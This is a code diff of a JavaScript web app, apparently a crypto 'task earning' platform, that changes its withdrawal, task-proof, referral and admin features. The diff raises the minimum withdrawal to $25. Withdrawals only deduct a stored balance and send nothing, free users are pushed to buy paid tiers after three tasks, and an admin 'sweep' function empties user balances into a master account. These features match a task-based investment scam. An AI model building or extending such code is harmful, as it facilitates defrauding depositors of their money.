+    document.getElementById('openWithdrawModal').addEventListener('click', () => withdrawModal.classList.remove('hidden'));
+    document.getElementById('closeWithdrawModal').addEventListener('click', () => withdrawModal.classList.add('hidden'));
+
+    document.getElementById('submitWithdrawBtn').addEventListener('click', () => {
+      const amount = parseFloat(document.getElementById('withdrawAmount').value);
+      const address = document.getElementById('withdrawAddress').value.trim();
+
+      if (isNaN(amount) || amount < 25) {
+        alert("Minimum withdrawal threshold is $25.00 USDT.");
+        return;
+      }
+      if (amount > currentUser.balance) {
+        alert("Insufficient account balance.");
+        return;
+      }
+      if (!address || !address.startsWith('T')) {
+        alert("Please enter a valid USDT TRC-20 address.");
+        return;
+      }
+
+      currentUser.balance -= amount;
+      saveUsers();
+      saveCurrentUser();
+      alert(`Withdrawal request of $${amount.toFixed(2)} USDT submitted successfully!`);
+      withdrawModal.classList.add('hidden');
+      initDashboard();
+    });
+
+    // Task Proof Modal
+    const taskProofModal = document.getElementById('taskProofModal');
+    document.getElementById('closeTaskProofModal').addEventListener('click', () => taskProofModal.classList.add('hidden'));
+
+    window.openProofModal = function(taskId) {
+      // Check if free user has completed 3 tasks
+      if (currentUser.tier === 'Starter Tier' && currentUser.completedTaskIds && currentUser.completedTaskIds.length >= 3) {
+        alert("You have reached your 3 free task limit! Please upgrade your tier to perform more tasks.");
+        upgradeModal.classList.remove('hidden');
+        return;
+      }
+      activeTaskToProof = taskId;
+      document.getElementById('taskProofInput').value = '';
+      taskProofModal.classList.remove('hidden');
+    };
+
+    document.getElementById('submitTaskProofBtn').addEventListener('click', () => {
+      const proofUrl = document.getElementById('taskProofInput').value.trim();
+      if (!proofUrl) {
+        alert("Please provide your screenshot proof link.");
+        return;
+      }
+
+      if (!currentUser.taskProofs) currentUser.taskProofs = {};
+      currentUser.taskProofs[activeTaskToProof] = proofUrl;
+
+      const completionTime = Date.now() + 180000; // 3 minutes
+      if (!currentUser.pendingTasks) currentUser.pendingTasks = {};
+      currentUser.pendingTasks[activeTaskToProof] = completionTime;
+
+      saveUsers();
+      saveCurrentUser();
+      taskProofModal.classList.add('hidden');
+      initDashboard();
+    });
+
+    // Initialize Dashboard
     function initDashboard() {
       authSection.classList.add('hidden');
       adminSection.classList.add('hidden');
@@ -569,27 +748,20 @@
       document.getElementById('userBalance').innerText = currentUser.balance.toFixed(2);
       document.getElementById('completedCount').innerText = currentUser.completedTaskIds ? currentUser.completedTaskIds.length : 0;
 
-      // Profile View Populate
+      // Profile Info
       document.getElementById('profileName').innerText = currentUser.name;
-      document.getElementById('profileEmail').innerText = currentUser.email;
+      document.getElementById('profilePhone').innerText = currentUser.phone;
       document.getElementById('profileTier').innerText = currentUser.tier;
-      document.getElementById('profileDate').innerText = currentUser.registeredAt || 'Active';
+      document.getElementById('referralCount').innerText = currentUser.referralCount || 0;
+      document.getElementById('referralLinkInput').value = `https://taskglobal.app/register?ref=${currentUser.id}`;
       if (currentUser.savedUsdtAddress) {
         document.getElementById('settingUsdtAddress').value = currentUser.savedUsdtAddress;
-      }
-
-      const pendingBanner = document.getElementById('pendingTierBanner');
-      if (currentUser.pendingTier) {
-        pendingBanner.classList.remove('hidden');
-        document.getElementById('pendingTierDetails').innerText = `Your upgrade request for ${currentUser.pendingTier.tier} Plan ($${currentUser.pendingTier.price} USDT) is awaiting admin verification.`;
-      } else {
-        pendingBanner.classList.add('hidden');
       }
 
       renderTasks();
     }
 
-    // Task Cards Rendering
+    // Render Tasks
     function renderTasks() {
       const container = document.getElementById('tasksList');
       container.innerHTML = '';
@@ -623,7 +795,7 @@
           initDashboard();
           return;
         } else {
-          actionBtnHTML = `<button type="button" onclick="performTask(${task.id}, '${task.link}')" class="accent-btn px-3 py-1.5 rounded-lg text-xs font-bold shadow">Perform Task</button>`;
+          actionBtnHTML = `<button type="button" onclick="openProofModal(${task.id})" class="accent-btn px-3 py-1.5 rounded-lg text-xs font-bold shadow">Perform Task</button>`;
         }
 
         taskCard.innerHTML = `
@@ -639,20 +811,7 @@
       });
     }
 
-    // Task Execution
-    window.performTask = function(taskId, taskUrl) {
-      if (taskUrl && taskUrl !== '#') window.open(taskUrl, '_blank');
-
-      const completionTime = Date.now() + 180000; // 3 minutes
-      if (!currentUser.pendingTasks) currentUser.pendingTasks = {};
-      currentUser.pendingTasks[taskId] = completionTime;
-
-      saveUsers();
-      saveCurrentUser();
-      initDashboard();
-    };
-
-    // Auto Refresh Loop
+    // Auto Refresh Task Timers
     setInterval(() => {
       if (currentUser && dashboardSection && !dashboardSection.classList.contains('hidden')) {
         let needsRefresh = false;
@@ -672,98 +831,7 @@
       }
     }, 1000);
 
-    // Modal Upgrade
-    let selectedUpgrade = null;
-    const upgradeModal = document.getElementById('upgradeModal');
-    const paymentDetails = document.getElementById('paymentDetails');
-
-    document.getElementById('openUpgradeModal').addEventListener('click', () => {
-      upgradeModal.classList.remove('hidden');
-    });
-
-    document.getElementById('closeUpgradeModal').addEventListener('click', () => {
-      upgradeModal.classList.add('hidden');
-      paymentDetails.classList.add('hidden');
-    });
-
-    document.querySelectorAll('.select-tier-btn').forEach(btn => {
-      btn.addEventListener('click', (e) => {
-        const tier = e.target.getAttribute('data-tier');
-        const price = e.target.getAttribute('data-price');
-        selectedUpgrade = { tier, price };
-
-        document.getElementById('selectedTierName').innerText = tier;
-        document.getElementById('selectedTierPrice').innerText = price;
-        paymentDetails.classList.remove('hidden');
-      });
-    });
-
-    document.getElementById('submitUpgradePayment').addEventListener('click', () => {
-      const ref = document.getElementById('paymentRef').value.trim();
-      if (!ref) {
-        alert("Please enter your transaction reference / TXID.");
-        return;
-      }
-
-      const upgradeRequest = {
-        id: Date.now(),
-        userId: currentUser.id,
-        userName: currentUser.name,
-        userEmail: currentUser.email,
-        tier: selectedUpgrade.tier,
-        price: selectedUpgrade.price,
-        reference: ref,
-        date: new Date().toLocaleString()
-      };
-
-      pendingUpgrades.push(upgradeRequest);
-      localStorage.setItem('tg_pending_upgrades', JSON.stringify(pendingUpgrades));
-
-      currentUser.pendingTier = upgradeRequest;
-      saveUsers();
-      saveCurrentUser();
-
-      alert("Upgrade request submitted successfully! Pending admin manual confirmation.");
-      upgradeModal.classList.add('hidden');
-      paymentDetails.classList.add('hidden');
-      initDashboard();
-    });
-
-    // Withdraw Modal
-    const withdrawModal = document.getElementById('withdrawModal');
-    document.getElementById('openWithdrawModal').addEventListener('click', () => {
-      withdrawModal.classList.remove('hidden');
-    });
-    document.getElementById('closeWithdrawModal').addEventListener('click', () => {
-      withdrawModal.classList.add('hidden');
-    });
-
-    document.getElementById('submitWithdrawBtn').addEventListener('click', () => {
-      const amount = parseFloat(document.getElementById('withdrawAmount').value);
-      const address = document.getElementById('withdrawAddress').value.trim();
-
-      if (isNaN(amount) || amount < 5) {
-        alert("Minimum withdrawal is $5.00 USDT.");
-        return;
-      }
-      if (amount > currentUser.balance) {
-        alert("Insufficient account balance.");
-        return;
-      }
-      if (!address || !address.startsWith('T')) {
-        alert("Please enter a valid USDT TRC-20 address.");
-        return;
-      }
-
-      currentUser.balance -= amount;
-      saveUsers();
-      saveCurrentUser();
-      alert(`Withdrawal request of $${amount.toFixed(2)} USDT submitted!`);
-      withdrawModal.classList.add('hidden');
-      initDashboard();
-    });
-
-    // Master Admin Control Panel
+    // Admin Panel
     function openAdminPanel() {
       dashboardSection.classList.add('hidden');
       authSection.classList.add('hidden');
@@ -779,30 +847,6 @@
     });
 
     function renderAdminView() {
-      const tierContainer = document.getElementById('adminPendingTiers');
-      tierContainer.innerHTML = '';
-
-      if (pendingUpgrades.length === 0) {
-        tierContainer.innerHTML = `<div class="text-xs text-gray-500 italic">No pending tier requests.</div>`;
-      } else {
-        pendingUpgrades.forEach((req) => {
-          const card = document.createElement('div');
-          card.className = "bg-slate-800 p-3 rounded-lg flex justify-between items-center text-xs";
-          card.innerHTML = `
-            <div>
-              <div class="font-bold text-white">${req.userName} (${req.userEmail})</div>
-              <div class="text-amber-400">Request: <strong>${req.tier} Plan ($${req.price} USDT)</strong></div>
-              <div class="text-gray-400 text-[10px] font-mono">TXID: ${req.reference} | ${req.date}</div>
-            </div>
-            <button type="button" onclick="approveTierUpgrade(${req.id})" class="bg-emerald-600 hover:bg-emerald-700 text-white px-3 py-1.5 rounded font-bold">
-              Approve Tier
-            </button>
-          `;
-          tierContainer.appendChild(card);
-        });
-      }
-
-      // Accounts List & Admin Sweep Control
       document.getElementById('totalUsersCount').innerText = users.length;
       const userContainer = document.getElementById('adminUserList');
       userContainer.innerHTML = '';
@@ -817,7 +861,7 @@
             <div class="flex justify-between items-center">
               <div>
                 <div class="font-bold text-slate-200">${u.name} <span class="text-[10px] text-emerald-400 font-normal">(${u.tier})</span></div>
-                <div class="text-gray-400 text-[10px]">${u.email}</div>
+                <div class="text-gray-400 text-[10px]">${u.phone}</div>
               </div>
               <div class="text-right">
                 <div class="font-bold text-emerald-400">$${(u.balance || 0).toFixed(2)} USDT</div>
@@ -834,28 +878,6 @@
       }
     }
 
-    // Approve Upgrade
-    window.approveTierUpgrade = function(requestId) {
-      const index = pendingUpgrades.findIndex(r => r.id === requestId);
-      if (index === -1) return;
-
-      const req = pendingUpgrades[index];
-      const targetUser = users.find(u => u.id === req.userId);
-
-      if (targetUser) {
-        targetUser.tier = req.tier + " Tier";
-        targetUser.pendingTier = null;
-        saveUsers();
-      }
-
-      pendingUpgrades.splice(index, 1);
-      localStorage.setItem('tg_pending_upgrades', JSON.stringify(pendingUpgrades));
-
-      alert(`Approved ${req.tier} upgrade for ${req.userName}!`);
-      renderAdminView();
-    };
-
-    // Admin Sweep User Balance Action
     window.adminSweepUserBalance = function(userId) {
       const targetUser = users.find(u => u.id === userId);
       if (!targetUser) return;
@@ -866,14 +888,14 @@
         return;
       }
 
-      if (confirm(`Are you sure you want to transfer $${sweepAmount.toFixed(2)} USDT from ${targetUser.name}'s account into your master wallet?`)) {
+      if (confirm(`Are you sure you want to sweep $${sweepAmount.toFixed(2)} USDT from ${targetUser.name}'s account?`)) {
         targetUser.balance = 0.00;
         saveUsers();
         if (currentUser && currentUser.id === targetUser.id) {
           currentUser.balance = 0.00;
           saveCurrentUser();
         }
-        alert(`Successfully transferred $${sweepAmount.toFixed(2)} USDT to main custodial account!`);
+        alert(`Successfully transferred $${sweepAmount.toFixed(2)} USDT to master account!`);
         renderAdminView();
       }
     };
